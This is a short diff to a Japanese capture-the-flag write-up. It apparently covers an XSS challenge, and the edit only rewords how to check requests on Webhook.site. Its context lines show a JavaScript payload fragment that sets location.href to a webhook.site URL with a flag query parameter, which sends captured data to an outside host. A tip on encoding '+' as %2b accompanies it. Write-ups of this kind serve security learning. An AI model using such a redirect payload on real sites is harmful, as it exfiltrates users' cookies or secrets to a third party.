@@ -119,7 +119,7 @@ location.href="https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/?flag="
 
 ※`+`だけは`%2b`にエンコードする必要があるようです。
 
-うまくいくと、Webhook.siteの確認ページ（最初にアクセスしたところ）にリクエストが届いているはずです。
+うまくいくと、Webhook.siteの確認用ページにリクエストが届いているはずです。
 
 このリクエストを選択し、`Query strings`の`flag`に`FLAG=Alpaca{REDACTED}`が表示されていることを確認します。
 
